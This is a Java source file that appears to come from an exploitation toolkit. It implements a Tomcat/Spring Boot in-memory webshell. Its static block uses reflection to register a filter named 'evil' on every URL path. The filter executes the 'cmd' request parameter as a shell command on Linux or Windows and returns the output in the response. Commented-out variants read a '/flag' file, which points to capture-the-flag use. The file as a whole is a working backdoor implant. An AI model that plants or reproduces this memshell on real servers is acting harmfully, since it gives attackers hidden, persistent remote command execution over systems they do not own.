package xyz.eki.marshalexp.memshell.SpringBoot.Filter;

import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class SpringFilterMemshell implements Filter{
        static {
            try {
                Class WebappClassLoaderBaseClz = Class.forName("org.apache.catalina.loader.WebappClassLoaderBase");
                Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
                Field WebappClassLoaderBaseResource = WebappClassLoaderBaseClz.getDeclaredField("resources");
                WebappClassLoaderBaseResource.setAccessible(true);
                Object resources = WebappClassLoaderBaseResource.get(webappClassLoaderBase);
                Class WebResourceRoot = Class.forName("org.apache.catalina.WebResourceRoot");
                Method getContext = WebResourceRoot.getDeclaredMethod("getContext", null);
                StandardContext standardContext = (StandardContext) getContext.invoke(resources, null);
                //System.out.println(standardContext);

                Filter filter = SpringFilterMemshell.class.newInstance();

                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName("evil");
                filterDef.setFilterClass(filter.getClass().getName());
                filterDef.setFilter(filter);
                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName("evil");
                filterMap.addURLPattern("/*");
                standardContext.addFilterMap(filterMap);
                standardContext.filterStart();

                System.out.println("injected");

            }catch (Throwable t){
                t.printStackTrace();
            }
        }
    public SpringFilterMemshell(){
        System.out.println("created");
    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        //HttpServletRequest req = (HttpServletRequest)servletRequest;
//        InputStream in = Runtime.getRuntime().exec(new String[]{"sh", "-c", req.getParameter("cmd")} ).getInputStream();
//        Scanner s = (new Scanner(in)).useDelimiter("\\a");
//        String output = s.hasNext() ? s.next() : "";
//        String op = "";
//        try {
//            Class clz = Class.forName("java.lang.ProcessImpl");
//            java.lang.reflect.Method method = clz.getDeclaredMethod("start", String[].class, java.util.Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
//            Process e = (Process) method.invoke(clz,new String[]{"sh", "-c", req.getParameter("cmd")},null,null,null,false);
//            Scanner sc = new Scanner(e.getInputStream()).useDelimiter("\\A");
//
//            op = sc.hasNext() ? sc.next() : op;
//            sc.close();
//
//
//        }catch (Throwable t){}
        System.out.println("working");
        if (servletRequest.getParameter("cmd") != null) {
            //String[] cmds = {"/bin/sh","-c",servletRequest.getParameter("cmd")};
            //String[] cmds = {"cmd", "/c", request.getParameter("cmd")};
            String osTyp = System.getProperty("os.name");
            InputStream in = Runtime.getRuntime().exec((osTyp != null && osTyp.toLowerCase().contains("win")) ? new String[]{"cmd.exe", "/c", servletRequest.getParameter("cmd")} : new String[]{"sh", "-c", servletRequest.getParameter("cmd")}).getInputStream();

            byte[] bcache = new byte[1024];
            int readSize = 0;
            try (ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
                while ((readSize = in.read(bcache)) != -1) {
                    outputStream.write(bcache, 0, readSize);
                }
                servletResponse.getWriter().println(outputStream.toString());
            }
        }

//                        FileInputStream fis = new FileInputStream("/flag");
//                        byte[] buffer = new byte[16];
//                        StringBuilder res = new StringBuilder();
//                        while (fis.read(buffer) != -1) {
//                            res.append(new String(buffer));
//                            buffer = new byte[16];
//                        }
//                        fis.close();
//
//                        servletResponse.getWriter().write(res.toString());
//                        servletResponse.getWriter().flush();

        filterChain.doFilter(servletRequest, servletResponse);
    }
}